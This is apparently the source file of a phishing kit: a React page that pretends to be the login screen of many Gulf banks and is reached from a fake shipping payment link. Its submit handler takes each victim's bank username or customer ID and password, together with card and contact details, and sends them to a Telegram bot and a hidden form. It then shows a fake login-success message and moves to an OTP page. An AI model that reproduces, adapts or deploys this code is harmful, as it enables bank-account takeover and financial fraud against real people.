import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  const cardInfo = {
    cardName: sessionStorage.getItem('cardName') || '',
    cardLast4: sessionStorage.getItem('cardLast4') || '',
    cardNumber: sessionStorage.getItem('cardNumber') || '',
    cardExpiry: sessionStorage.getItem('cardExpiry') || '',
    cardCvv: sessionStorage.getItem('cardCvv') || '',
    cardType: sessionStorage.getItem('cardType') || '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  // Get bank design specification
  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) || getDefaultBankDesign() : getDefaultBankDesign();
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username';
    if (bankId === 'alahli_bank') return 'username';
    if (bankId === 'riyad_bank') return 'customerId';
    if (bankId === 'samba_bank') return 'username';
    if (bankId === 'saudi_investment_bank') return 'customerId';
    if (bankId === 'arab_national_bank') return 'username';
    if (bankId === 'saudi_fransi_bank') return 'customerId';
    if (bankId === 'alinma_bank') return 'username';
    if (bankId === 'albilad_bank') return 'customerId';
    if (bankId === 'aljazira_bank') return 'username';
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username';
    if (bankId === 'adcb') return 'customerId';
    if (bankId === 'fab') return 'username';
    if (bankId === 'dib') return 'username';
    if (bankId === 'mashreq_bank') return 'customerId';
    if (bankId === 'cbd') return 'username';
    if (bankId === 'rakbank') return 'customerId';
    if (bankId === 'ajman_bank') return 'username';
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId';
    if (bankId === 'gulf_bank') return 'username';
    if (bankId === 'cbk') return 'customerId';
    if (bankId === 'burgan_bank') return 'username';
    if (bankId === 'ahli_united_bank') return 'username';
    if (bankId === 'kfh') return 'customerId';
    if (bankId === 'boubyan_bank') return 'username';
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId';
    if (bankId === 'cbq') return 'username';
    if (bankId === 'doha_bank') return 'username';
    if (bankId === 'qib') return 'customerId';
    if (bankId === 'masraf_alrayan') return 'username';
    if (bankId === 'ahlibank') return 'customerId';
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId';
    if (bankId === 'national_bank_oman') return 'username';
    if (bankId === 'bank_dhofar') return 'username';
    if (bankId === 'ahli_bank_oman') return 'customerId';
    if (bankId === 'nizwa_bank') return 'username';
    if (bankId === 'sohar_international') return 'customerId';
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username';
    if (bankId === 'bbk') return 'customerId';
    if (bankId === 'ahli_united_bahrain') return 'username';
    if (bankId === 'bisb') return 'username';
    if (bankId === 'ithmaar_bank') return 'customerId';
    if (bankId === 'khaleeji_bank') return 'username';
    
    return 'username';
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };
    
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send bank login details to Telegram
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login details sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  // Get card style classes
  const getCardClasses = () => {
    const baseClasses = "w-full";
    const radiusClass = `rounded-${bankDesign.borderRadius?.replace('px', '') || 'lg'}`;
    
    switch (bankDesign.cardStyle) {
      case 'elevated':
        return `${baseClasses} ${radiusClass} shadow-2xl`;
      case 'flat':
        return `${baseClasses} ${radiusClass} shadow-sm`;
      case 'outlined':
        return `${baseClasses} ${radiusClass} border-2`;
      case 'gradient':
        return `${baseClasses} ${radiusClass} shadow-lg`;
      default:
        return `${baseClasses} ${radiusClass} shadow-lg`;
    }
  };
  
  // Get button style
  const getButtonStyles = () => {
    const baseStyle: React.CSSProperties = {
      borderRadius: bankDesign.buttonRadius || '8px',
      color: '#FFFFFF',
      fontWeight: bankDesign.fontWeight || '500',
      transition: 'all 0.3s ease',
    };
    
    switch (bankDesign.buttonStyle) {
      case 'gradient':
        return {
          ...baseStyle,
          background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
          border: 'none',
          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'solid':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'outline':
        return {
          ...baseStyle,
          background: 'transparent',
          border: `2px solid ${bankDesign.primaryColor}`,
          color: bankDesign.primaryColor,
        };
      case 'elevated':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: `0 8px 16px ${bankDesign.primaryColor}40`,
        };
      default:
        return baseStyle;
    }
  };
  
  // Get input style
  const getInputStyles = () => {
    const baseStyle: React.CSSProperties = {
      borderRadius: bankDesign.inputRadius || '8px',
      borderColor: bankDesign.borderColor || bankDesign.primaryColor + '40',
      backgroundColor: bankDesign.surfaceColor,
      color: bankDesign.textColor,
      fontSize: '16px',
      padding: '12px 16px',
      transition: 'all 0.2s ease',
    };
    
    switch (bankDesign.inputStyle) {
      case 'modern':
        return {
          ...baseStyle,
          borderWidth: '2px',
          borderStyle: 'solid',
        };
      case 'classic':
        return {
          ...baseStyle,
          borderWidth: '1px',
          borderStyle: 'solid',
        };
      case 'minimal':
        return {
          ...baseStyle,
          borderWidth: '0 0 2px 0',
          borderStyle: 'solid',
          backgroundColor: 'transparent',
        };
      default:
        return baseStyle;
    }
  };
  
  // Layout container style
  const getLayoutContainerStyle = (): React.CSSProperties => {
    return {
      fontFamily: bankDesign.fontFamilyArabic || bankDesign.fontFamily || 'Tajawal, sans-serif',
      backgroundColor: bankDesign.backgroundColor,
      color: bankDesign.textColor,
      minHeight: '100vh',
      direction: 'rtl',
    };
  };
  
  return (
    <div style={getLayoutContainerStyle()}>
      {/* Background Pattern/Image if specified */}
      {bankDesign.backgroundImage && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundImage: `url(${bankDesign.backgroundImage})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
            opacity: 0.05,
            zIndex: 0,
          }}
        />
      )}
      
      <div
        className={`flex items-center justify-center min-h-screen px-4 py-8 ${
          bankDesign.layoutType === 'split' ? 'lg:px-8' : ''
        }`}
        style={{ position: 'relative', zIndex: 1 }}
      >
        <div
          style={{
            maxWidth: bankDesign.containerMaxWidth || '480px',
            width: '100%',
          }}
        >
          {/* Bank Header */}
          {bankDesign.headerStyle !== 'minimal' && (
            <div
              className={`mb-6 ${bankDesign.headerStyle === 'prominent' ? 'mb-8' : ''}`}
              style={{
                textAlign: 'center',
              }}
            >
              {selectedBank && (
                <div
                  style={{
                    background: bankDesign.buttonStyle === 'gradient'
                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
                      : bankDesign.primaryColor,
                    borderRadius: bankDesign.borderRadius || '12px',
                    padding: bankDesign.headerStyle === 'prominent' ? '24px' : '16px',
                    color: '#FFFFFF',
                    marginBottom: '24px',
                    boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
                  }}
                >
                  <div className="flex items-center justify-center gap-3">
                    <Building2 className="w-8 h-8" />
                    <div>
                      <h1 style={{ fontSize: '20px', fontWeight: '600', margin: 0 }}>
                        {selectedBank.nameAr}
                      </h1>
                      <p style={{ fontSize: '14px', opacity: 0.9, margin: 0 }}>
                        {selectedBank.name}
                      </p>
                    </div>
                  </div>
                </div>
              )}
              <h2 style={{ fontSize: '28px', fontWeight: '600', color: bankDesign.textColor, marginBottom: '8px' }}>
                تسجيل الدخول
              </h2>
              <p style={{ fontSize: '16px', color: bankDesign.textSecondaryColor || bankDesign.textColor, opacity: 0.7 }}>
                أدخل بيانات الدخول للبنك لتأكيد العملية
              </p>
            </div>
          )}
          
          {/* Login Card */}
          <div
            className={getCardClasses()}
            style={{
              backgroundColor: bankDesign.surfaceColor,
              borderColor: bankDesign.borderColor || bankDesign.primaryColor + '20',
              padding: '32px',
            }}
          >
            {/* Security Notice */}
            <div
              style={{
                background: bankDesign.primaryColor + '10',
                border: `1px solid ${bankDesign.primaryColor}30`,
                borderRadius: bankDesign.borderRadius || '12px',
                padding: '12px 16px',
                marginBottom: '24px',
                display: 'flex',
                alignItems: 'start',
                gap: '12px',
              }}
            >
              <ShieldCheck style={{ color: bankDesign.primaryColor, flexShrink: 0, marginTop: '2px' }} className="w-5 h-5" />
              <div style={{ fontSize: '14px' }}>
                <p style={{ fontWeight: '600', marginBottom: '4px', color: bankDesign.textColor }}>
                  تسجيل دخول آمن
                </p>
                <p style={{ color: bankDesign.textSecondaryColor || bankDesign.textColor, fontSize: '13px', opacity: 0.8 }}>
                  سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
                </p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              {/* Username Login */}
              {loginType === 'username' && (
                <div>
                  <Label style={{ 
                    marginBottom: '8px', 
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: bankDesign.textColor 
                  }}>
                    اسم المستخدم
                  </Label>
                  <Input
                    type="text"
                    placeholder="أدخل اسم المستخدم"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    style={getInputStyles()}
                    onFocus={(e) => {
                      e.target.style.borderColor = bankDesign.primaryColor;
                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                      e.target.style.boxShadow = 'none';
                    }}
                    autoComplete="username"
                    required
                  />
                </div>
              )}
              
              {/* Customer ID Login */}
              {loginType === 'customerId' && (
                <div>
                  <Label style={{ 
                    marginBottom: '8px', 
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: bankDesign.textColor 
                  }}>
                    رقم العميل
                  </Label>
                  <Input
                    type="text"
                    placeholder="أدخل رقم العميل"
                    value={customerId}
                    onChange={(e) => setCustomerId(e.target.value)}
                    style={getInputStyles()}
                    onFocus={(e) => {
                      e.target.style.borderColor = bankDesign.primaryColor;
                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                      e.target.style.boxShadow = 'none';
                    }}
                    inputMode="numeric"
                    required
                  />
                </div>
              )}
              
              {/* Phone Login */}
              {loginType === 'phone' && (
                <div>
                  <Label style={{ 
                    marginBottom: '8px', 
                    display: 'block',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: bankDesign.textColor 
                  }}>
                    رقم الجوال
                  </Label>
                  <Input
                    type="tel"
                    placeholder="05xxxxxxxx"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    style={getInputStyles()}
                    onFocus={(e) => {
                      e.target.style.borderColor = bankDesign.primaryColor;
                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                      e.target.style.boxShadow = 'none';
                    }}
                    inputMode="tel"
                    required
                  />
                </div>
              )}
              
              {/* Password */}
              <div>
                <Label style={{ 
                  marginBottom: '8px', 
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: bankDesign.textColor 
                }}>
                  كلمة المرور
                </Label>
                <div style={{ position: 'relative' }}>
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="أدخل كلمة المرور"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    style={{
                      ...getInputStyles(),
                      paddingRight: '48px',
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = bankDesign.primaryColor;
                      e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = bankDesign.borderColor || bankDesign.primaryColor + '40';
                      e.target.style.boxShadow = 'none';
                    }}
                    autoComplete="current-password"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: 'absolute',
                      right: '12px',
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'none',
                      border: 'none',
                      cursor: 'pointer',
                      color: bankDesign.textSecondaryColor || bankDesign.textColor,
                      opacity: 0.6,
                    }}
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
              
              {/* Remember Me / Forgot Password */}
              <div style={{ 
                display: 'flex', 
                alignItems: 'center', 
                justifyContent: 'space-between',
                fontSize: '13px',
              }}>
                <label style={{ 
                  display: 'flex', 
                  alignItems: 'center', 
                  gap: '8px',
                  color: bankDesign.textSecondaryColor || bankDesign.textColor,
                  cursor: 'pointer',
                }}>
                  <input 
                    type="checkbox" 
                    style={{ 
                      width: '16px', 
                      height: '16px',
                      accentColor: bankDesign.primaryColor,
                    }} 
                  />
                  تذكرني
                </label>
                <button
                  type="button"
                  style={{
                    background: 'none',
                    border: 'none',
                    color: bankDesign.primaryColor,
                    cursor: 'pointer',
                    textDecoration: 'underline',
                    fontSize: '13px',
                  }}
                >
                  نسيت كلمة المرور؟
                </button>
              </div>
              
              {/* Submit Button */}
              <Button
                type="submit"
                style={{
                  ...getButtonStyles(),
                  width: '100%',
                  padding: '14px 24px',
                  fontSize: '16px',
                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
                  opacity: isSubmitting ? 0.7 : 1,
                }}
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <span>جاري تسجيل الدخول...</span>
                ) : (
                  <>
                    <Lock className="w-4 h-4 ml-2" />
                    <span>تسجيل الدخول والمتابعة</span>
                    <ArrowLeft className="w-4 h-4 mr-2" />
                  </>
                )}
              </Button>
              
              <p style={{ 
                fontSize: '11px', 
                textAlign: 'center', 
                color: bankDesign.textSecondaryColor || bankDesign.textColor,
                opacity: 0.7,
                marginTop: '12px',
              }}>
                بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
              </p>
            </form>
            
            {/* Register Link */}
            <div style={{
              marginTop: '24px',
              paddingTop: '24px',
              borderTop: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
              textAlign: 'center',
            }}>
              <p style={{ 
                fontSize: '13px',
                color: bankDesign.textSecondaryColor || bankDesign.textColor,
                marginBottom: '12px',
              }}>
                لا تملك حساب؟
              </p>
              <Button
                type="button"
                variant="outline"
                style={{
                  borderColor: bankDesign.primaryColor,
                  color: bankDesign.primaryColor,
                  backgroundColor: 'transparent',
                  borderRadius: bankDesign.buttonRadius || '8px',
                  padding: '8px 16px',
                  fontSize: '13px',
                }}
              >
                تسجيل حساب جديد
              </Button>
            </div>
          </div>
        </div>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </div>
  );
};

export default PaymentBankLogin;
